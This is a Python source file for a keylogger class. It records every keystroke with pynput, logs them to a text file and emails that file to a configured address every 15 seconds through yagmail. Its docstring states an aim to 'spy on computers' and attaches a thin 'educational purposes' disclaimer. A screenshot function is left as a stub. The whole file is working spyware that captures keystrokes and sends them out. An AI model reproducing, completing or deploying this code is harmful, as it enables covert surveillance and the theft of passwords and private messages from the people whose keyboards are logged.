from pynput.keyboard import Key, Listener # used to listen to keystrokes
import logging, time, yagmail  # import used to log, get elapsed time, and send emails
from logging.handlers import TimedRotatingFileHandler # used to rotate logs 

log_flush = 10
email_send = 15

class KeyLogger:
    """
    Class used to track keystrokes and spy on computers using screenshots
    <!This is solely for educational purposes!>
        
    KeyLogger used to track keystrokes on keyboards
    to_email: email being sent to by logger
    log_email: loggers email account
    mem: string buffer to minimize logging writeouts
    start_time: time of the current logging cycle
    """
    def __init__(self, email="", log_dir=""):
        # email
        self.to_email = email
        self.log_email = ""

        # buffer
        self.mem = []
        self.start_time = time.time()
        self.email_time = self.start_time
        
        # logging 
        self.filename = "key_log.txt"
        logging.basicConfig(filename=(log_dir + self.filename), level=logging.INFO, format='%(asctime)s: %(message)s')

    def run_keylogger(self):
        """
        Runs keylogger. key_log.txt will be updated every 10 seconds and 
        """
        with Listener(on_press=self.__on_press) as listener:
            try:
                listener.join()
            except Exception:
                print("Threading error")

    def __screenshot(self):
        """
        Takes screenshot of computer
        """
        # TODO takes a screenshot of the persons screen
        return None
        
    def __on_press(self, key):
        """
        Action taken on keyboard press
        """
        c = str(key).replace("'", "")
        self.mem.append(c)
        # log the data, update time and flush buffer
        if self.__check_time(log_flush, self.start_time):
            logging.info("".join(self.mem))
            self.mem.clear() 
            self.start_time = time.time()
        
        # check to see if it's time to email
        if self.__check_time(email_send, self.email_time):
            self.send_email()
            self.email_time = time.time()
            # rollover the log
    
    def send_email(self):
        """
        Sends email to email to the log email specified in the program
        """
        yag = yagmail.SMTP(self.log_email)
        yag.send(
            to=self.to_email,
            subject="Current Log ru",
            contents="Please see the attached document for keystrokes in the past 2 minutes", 
            attachments=self.filename,
        )

    def __check_time(self, check, curr_time):
        """
        private function used to decide if appropriate to continue based on time
        """
        return True if time.time() - curr_time >= check else False
    
